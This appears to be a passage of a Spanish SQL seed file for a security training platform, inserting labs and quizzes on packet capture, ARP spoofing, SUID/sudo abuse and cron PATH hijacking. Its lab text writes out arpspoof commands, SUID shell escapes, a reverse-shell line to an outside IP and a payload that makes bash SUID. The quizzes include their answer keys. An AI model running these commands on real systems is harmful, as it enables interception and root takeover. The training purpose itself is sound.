ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'filter port 80 POST', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Captura en capa 2 y analiza hasta capa 7', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Solo opera en capa 3 (Red)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Solo opera en capa 7 (Aplicación)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Opera exclusivamente en capa 4 (Transporte)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Captura de paquetes con tcpdump',
  E'## Objetivo\n\nUsa tcpdump para capturar tráfico de red en la interfaz eth0 y guardarlo en un archivo pcap.\n\n## Instrucciones\n\n```bash\ntcpdump -i eth0 -w captura.pcap\n```\n\n**Flags utilizados:**\n- `-i eth0`: especifica la interfaz de red a escuchar\n- `-w captura.pcap`: escribe los paquetes capturados en un archivo pcap\n\nPara detener la captura usa `Ctrl+C`. El archivo resultante puede abrirse con Wireshark para análisis visual.\n\n**Filtros útiles adicionales:**\n\n```bash\n# Solo tráfico HTTP\ntcpdump -i eth0 port 80 -w http.pcap\n\n# Solo tráfico hacia una IP específica\ntcpdump -i eth0 host 10.10.10.1 -w objetivo.pcap\n```\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'tcpdump -i eth0 -w captura.pcap',
  '¡Muy bien! Has iniciado la captura de paquetes. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'wireshark-tcpdump' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- ── Lab 4: Envenenamiento ARP ─────────────────────────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'envenenamiento-arp',
  'Ataque Man-in-the-Middle con Envenenamiento ARP',
  E'## ¿Qué es ARP?\n\n**ARP (Address Resolution Protocol)** traduce direcciones IP (capa 3) a direcciones MAC (capa 2). Cuando un host quiere comunicarse con otro en la misma red, envía un broadcast preguntando: *"¿Quién tiene la IP 192.168.1.1? Dime tu MAC."*\n\n## La vulnerabilidad\n\nARP no tiene mecanismo de autenticación. Cualquier host puede enviar respuestas ARP falsas (*ARP replies* no solicitadas), lo que permite el **ARP Spoofing** o **ARP Poisoning**.\n\n## Ataque Man-in-the-Middle (MitM)\n\n```\nAtacante envía ARP falso a la Víctima: "La IP del Gateway es MI MAC"\nAtacante envía ARP falso al Gateway: "La IP de la Víctima es MI MAC"\n\nResultado: todo el tráfico víctima ↔ gateway pasa por el atacante\n```\n\n## Herramientas\n\n```bash\n# Paso 1: habilitar reenvío de paquetes (para no cortar la comunicación)\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# Paso 2: envenenar ARP de la víctima (decirle que somos el gateway)\narpspoof -i eth0 -t 192.168.1.100 192.168.1.1\n\n# Paso 3: envenenar ARP del gateway (decirle que somos la víctima)\narpspoof -i eth0 -t 192.168.1.1 192.168.1.100\n```\n\n## Defensa\n\n- **Dynamic ARP Inspection (DAI)** en switches administrados.\n- **ARP estático** en hosts críticos.\n- Usar solo comunicaciones cifradas (TLS/HTTPS).\n\n---\nCompleta el quiz y la actividad para ganar **300 puntos**.',
  2, 35, 300, TRUE
FROM course_modules cm WHERE cm.slug = 'analisis-trafico-red'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab envenenamiento-arp

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿En qué capa del modelo OSI opera el protocolo ARP?',
  'ARP opera entre la capa 2 (Enlace de datos) y la capa 3 (Red): traduce direcciones IP (capa 3) a direcciones MAC (capa 2).'
FROM laboratories l WHERE l.slug = 'envenenamiento-arp'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Por qué ARP es vulnerable al spoofing?',
  'ARP no tiene mecanismo de autenticación: cualquier host puede enviar respuestas ARP no solicitadas y los demás las aceptarán, actualizando sus cachés ARP.'
FROM laboratories l WHERE l.slug = 'envenenamiento-arp'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Qué hace el comando "echo 1 > /proc/sys/net/ipv4/ip_forward" en un ataque MitM?',
  'Habilita el reenvío de paquetes IP en el kernel de Linux. Sin esto, el atacante descartaría los paquetes de la víctima en vez de reenviarlos, cortando la comunicación.'
FROM laboratories l WHERE l.slug = 'envenenamiento-arp'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Qué tecnología de los switches administrados mitiga el envenenamiento ARP?',
  'Dynamic ARP Inspection (DAI) valida los paquetes ARP contra una tabla DHCP snooping, rechazando respuestas ARP que no coincidan con los bindings IP-MAC conocidos.'
FROM laboratories l WHERE l.slug = 'envenenamiento-arp'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Habilita el reenvío de paquetes IP en Linux para realizar un ataque MitM. Copia la respuesta generada.',
  'echo 1 > /proc/sys/net/ipv4/ip_forward activa el IP forwarding en el kernel de Linux, necesario para reenviar el tráfico interceptado.'
FROM laboratories l WHERE l.slug = 'envenenamiento-arp'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Entre capa 2 (Enlace) y capa 3 (Red)', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Capa 4 (Transporte)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Capa 7 (Aplicación)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Capa 1 (Física)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'No autentica las respuestas ARP: cualquier host puede enviarlas', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Usa cifrado débil en las respuestas', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Transmite las MAC en texto plano por la red', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'No distingue entre IPv4 e IPv6', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Habilita el reenvío de paquetes para no interrumpir la comunicación', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Desactiva el firewall del sistema', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'Habilita el modo promiscuo en la interfaz de red', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'Borra la caché ARP del sistema', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Dynamic ARP Inspection (DAI)', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Port Security', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'STP (Spanning Tree Protocol)', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'VLAN Trunking', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Habilitar IP Forwarding para ataque MitM',
  E'## Objetivo\n\nHabilita el reenvío de paquetes IP en Linux, paso previo indispensable para un ataque Man-in-the-Middle.\n\n## Instrucciones\n\n```bash\necho 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n**¿Por qué es necesario?**\n\nSin IP forwarding activo, cuando el tráfico de la víctima llega al atacante, el kernel lo descartaría en vez de reenviarlo al destino real. Esto cortaría la comunicación y alertaría a la víctima.\n\nCon IP forwarding activo, el atacante actúa transparentemente: recibe, inspecciona y reenvía todos los paquetes.\n\n**Pasos completos del ataque:**\n\n```bash\n# 1. Habilitar forwarding\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# 2. Envenenar ARP de la víctima\narpspoof -i eth0 -t 192.168.1.100 192.168.1.1\n\n# 3. Envenenar ARP del gateway (en otra terminal)\narpspoof -i eth0 -t 192.168.1.1 192.168.1.100\n```\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'echo 1 > /proc/sys/net/ipv4/ip_forward',
  '¡Correcto! Has habilitado el IP forwarding. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'envenenamiento-arp' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- =============================================================================
-- CURSO 3: Pentesting Avanzado y Escalada de Privilegios (avanzado)
-- =============================================================================

INSERT INTO courses (slug, title, description, difficulty, is_published, created_by)
SELECT
  'pentesting-avanzado',
  'Pentesting Avanzado y Escalada de Privilegios',
  'Técnicas avanzadas de post-explotación: escalada de privilegios en Linux, abuso de configuraciones sudo/SUID, explotación de cron jobs y fundamentos de buffer overflow.',
  'avanzado',
  TRUE,
  id
FROM users WHERE username = 'admin'
ON CONFLICT (slug) DO UPDATE SET
  title       = EXCLUDED.title,
  description = EXCLUDED.description,
  difficulty  = EXCLUDED.difficulty,
  is_published = EXCLUDED.is_published;

-- ── Módulo 1: Escalada de Privilegios en Linux ────────────────────────────────

INSERT INTO course_modules (course_id, slug, title, description, position)
SELECT c.id, 'escalada-privilegios-linux',
  'Escalada de Privilegios en Linux',
  'Técnicas para pasar de usuario sin privilegios a root: SUID, sudo misconfiguration, variables de entorno y cron jobs mal configurados.',
  1
FROM courses c WHERE c.slug = 'pentesting-avanzado'
ON CONFLICT (course_id, slug) DO UPDATE SET
  title = EXCLUDED.title, description = EXCLUDED.description, position = EXCLUDED.position;

-- ── Lab 5: Binarios SUID y configuraciones sudo ───────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'suid-sudo-misconfig',
  'Escalada con Binarios SUID y sudo',
  E'## El bit SUID\n\nEl bit **SUID (Set User ID)** es un permiso especial de Linux. Cuando se activa en un binario, ese binario se ejecuta con los permisos del **propietario del archivo** en vez del usuario que lo invoca.\n\nSi un binario con SUID es propiedad de `root` y permite ejecutar comandos arbitrarios, cualquier usuario puede escalar a root.\n\n```bash\n# Buscar todos los binarios con SUID activo\nfind / -perm -4000 -type f 2>/dev/null\n```\n\n## Ejemplos comunes de abuso SUID\n\n| Binario | Explotación |\n|---------|-------------|\n| `/usr/bin/find` | `find . -exec /bin/sh -p \\;` |\n| `/usr/bin/vim` | `:!bash` desde vim |\n| `/usr/bin/python3` | `python3 -c "import os; os.setuid(0); os.system(''bash'')"` |\n| `/usr/bin/nmap` | `nmap --interactive` → `!sh` (versiones antiguas) |\n\n## Abuso de sudo\n\nEl archivo `/etc/sudoers` define qué comandos puede ejecutar cada usuario con `sudo`. Una mala configuración común es `NOPASSWD`:\n\n```\nwww-data ALL=(ALL) NOPASSWD: /usr/bin/python3\n```\n\nEsto permite a `www-data` ejecutar python3 como root sin contraseña:\n\n```bash\nsudo python3 -c "import os; os.system(''bash'')" \n```\n\n## GTFOBins\n\n**GTFOBins** (gtfobins.github.io) es una referencia de binarios Unix que pueden usarse para escalar privilegios cuando tienen SUID o permisos sudo.\n\n---\nCompleta el quiz y la actividad para ganar **350 puntos**.',
  1, 40, 350, TRUE
FROM course_modules cm WHERE cm.slug = 'escalada-privilegios-linux'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab suid-sudo-misconfig

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿Qué efecto tiene el bit SUID activado en un binario propiedad de root?',
  'Con SUID activado, el binario se ejecuta con los privilegios del propietario (root) independientemente de quién lo invoque. Esto es necesario para binarios como passwd, pero peligroso si el binario permite ejecución arbitraria de comandos.'
FROM laboratories l WHERE l.slug = 'suid-sudo-misconfig'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿Qué opción de sudo en /etc/sudoers permite ejecutar un comando sin pedir contraseña?',
  'NOPASSWD elimina el requisito de contraseña para el comando especificado. Es una mala práctica de seguridad que frecuentemente resulta en escalada de privilegios.'
FROM laboratories l WHERE l.slug = 'suid-sudo-misconfig'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Qué permiso octal representa el bit SUID combinado con permisos rwxr-xr-x?',
  '4755 en octal: el primer dígito "4" activa el bit SUID. Los tres siguientes (755) son rwxr-xr-x: propietario tiene rwx, grupo y otros tienen r-x.'
FROM laboratories l WHERE l.slug = 'suid-sudo-misconfig'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Qué recurso online recopila técnicas de explotación de binarios con SUID o permisos sudo?',
  'GTFOBins (gtfobins.github.io) lista binarios Unix con técnicas documentadas para escalar privilegios, evadir restricciones y obtener shells cuando tienen configuraciones especiales.'
FROM laboratories l WHERE l.slug = 'suid-sudo-misconfig'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Busca todos los binarios con el bit SUID activo en el sistema. Copia la respuesta generada.',
  'find / -perm -4000 -type f 2>/dev/null busca archivos regulares (-type f) con el bit SUID activo (-perm -4000). El 2>/dev/null suprime los errores de permiso.'
FROM laboratories l WHERE l.slug = 'suid-sudo-misconfig'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

-- Opciones Q1
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'Se ejecuta con los privilegios de root, sin importar quién lo invoque', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Solo puede ser ejecutado por root', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'El binario queda oculto para otros usuarios', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'El binario se cifra automáticamente', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 1
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q2
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'NOPASSWD', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'ALL', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'EXEC', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'ROOT', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 2
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q3
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, '4755', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, '0755', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, '2755', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, '7755', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 3
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Opciones Q4
INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 1, 'GTFOBins', TRUE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 2, 'Exploit-DB', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 3, 'CVE Mitre', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

INSERT INTO laboratory_question_options (question_id, option_order, option_text, is_correct)
SELECT q.id, 4, 'HackTricks', FALSE FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 4
ON CONFLICT (question_id, option_order) DO NOTHING;

-- Actividad Q5
INSERT INTO question_activities (question_id, title, instructions_markdown, expected_action_key, success_feedback, is_published)
SELECT q.id,
  'Búsqueda de binarios con SUID',
  E'## Objetivo\n\nEnumera todos los binarios con el bit SUID activo en el sistema. Este es el primer paso en la enumeración de vectores de escalada de privilegios.\n\n## Instrucciones\n\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\n\n**Desglose del comando:**\n- `find /`: busca desde la raíz del sistema de archivos\n- `-perm -4000`: archivos donde el bit SUID (octal 4000) está activo\n- `-type f`: solo archivos regulares (no directorios ni enlaces)\n- `2>/dev/null`: redirige errores de permisos a /dev/null para una salida limpia\n\n**¿Qué buscar en los resultados?**\n\nBinarios como `/usr/bin/find`, `/usr/bin/python3`, `/usr/bin/vim` o `/usr/bin/nmap` con SUID son candidatos inmediatos para escalada. Consulta GTFOBins para técnicas de explotación de cada uno.\n\nCopia la **respuesta generada** y úsala en el quiz.',
  'find / -perm -4000 -type f 2>/dev/null',
  '¡Muy bien! Has encontrado los binarios SUID. Copia esta respuesta para el quiz.',
  TRUE
FROM laboratory_questions q
JOIN laboratories l ON q.laboratory_id = l.id
WHERE l.slug = 'suid-sudo-misconfig' AND q.question_order = 5
ON CONFLICT (question_id) DO NOTHING;

-- ── Lab 6: Path Hijacking y Cron Jobs ─────────────────────────────────────────

INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
SELECT cm.id,
  'path-hijacking-cronjobs',
  'Escalada con PATH Hijacking y Cron Jobs',
  E'## Cron Jobs en Linux\n\nEl **cron** es el planificador de tareas de Linux. Ejecuta comandos de forma automática en intervalos definidos. Las tareas del sistema se configuran en `/etc/crontab` y en `/etc/cron.d/`.\n\n```bash\n# Ver el crontab del sistema\ncat /etc/crontab\n\n# Ver el crontab del usuario actual\ncrontab -l\n```\n\n## Vectores de explotación\n\n### 1. Script con permisos de escritura para todos\n\nSi un cron job de root ejecuta un script que cualquiera puede modificar:\n\n```bash\n# El cron ejecuta cada minuto:\n# * * * * * root /opt/backup.sh\n\n# El script tiene permisos 777:\nls -la /opt/backup.sh  # -rwxrwxrwx\n\n# Un atacante puede modificarlo:\necho "bash -i >& /dev/tcp/10.10.10.2/4444 0>&1" >> /opt/backup.sh\n```\n\n### 2. PATH Hijacking\n\nSi un cron job llama un binario sin ruta absoluta (`backup` en vez de `/usr/bin/backup`), y el PATH incluye un directorio donde el atacante puede escribir:\n\n```bash\n# El cron contiene:\n# PATH=/tmp:/usr/local/bin:/usr/bin\n# * * * * * root backup\n\n# El atacante crea un binario malicioso en /tmp:\necho "chmod +s /bin/bash" > /tmp/backup\nchmod +x /tmp/backup\n\n# Cuando el cron ejecute, usará /tmp/backup y bash tendrá SUID\n```\n\n## Herramienta: pspy\n\n**pspy** monitorea procesos en tiempo real sin necesitar privilegios de root, revelando cron jobs y otros procesos:\n\n```bash\n./pspy64\n```\n\n---\nCompleta el quiz y la actividad para ganar **400 puntos**.',
  2, 45, 400, TRUE
FROM course_modules cm WHERE cm.slug = 'escalada-privilegios-linux'
ON CONFLICT (module_id, slug) DO UPDATE SET
  title = EXCLUDED.title, content_markdown = EXCLUDED.content_markdown,
  position = EXCLUDED.position, estimated_minutes = EXCLUDED.estimated_minutes,
  points = EXCLUDED.points, is_published = EXCLUDED.is_published;

-- Preguntas Lab path-hijacking-cronjobs

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 1, 'multiple_choice',
  '¿En qué archivo se definen los cron jobs del sistema con su usuario de ejecución?',
  '/etc/crontab define las tareas programadas del sistema, incluyendo el usuario con el que se ejecuta cada tarea (generalmente root). Es distinto de los crontabs de usuario (/var/spool/cron/).'
FROM laboratories l WHERE l.slug = 'path-hijacking-cronjobs'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 2, 'multiple_choice',
  '¿En qué consiste el ataque de PATH Hijacking en cron jobs?',
  'Si el cron llama un binario sin ruta absoluta y el PATH incluye un directorio escribible por el atacante, se puede crear un ejecutable malicioso con el mismo nombre que será invocado en su lugar.'
FROM laboratories l WHERE l.slug = 'path-hijacking-cronjobs'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 3, 'multiple_choice',
  '¿Qué formato tienen los cinco primeros campos de una entrada en /etc/crontab?',
  'El formato es: minuto hora dia-del-mes mes dia-de-semana. Por ejemplo "* * * * *" significa "cada minuto". Un cron "0 2 * * 1" se ejecuta los lunes a las 2:00 AM.'
FROM laboratories l WHERE l.slug = 'path-hijacking-cronjobs'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 4, 'multiple_choice',
  '¿Qué herramienta monitorea procesos en tiempo real sin privilegios de root para descubrir cron jobs?',
  'pspy (github.com/DominicBreuker/pspy) captura la ejecución de procesos usando inotify y /proc, revelando cron jobs y otros procesos privilegiados sin requerir root.'
FROM laboratories l WHERE l.slug = 'path-hijacking-cronjobs'
ON CONFLICT (laboratory_id, question_order) DO NOTHING;

INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
SELECT l.id, 5, 'activity_response',
  'Lee el contenido del crontab del sistema para identificar tareas programadas. Copia la respuesta generada.',
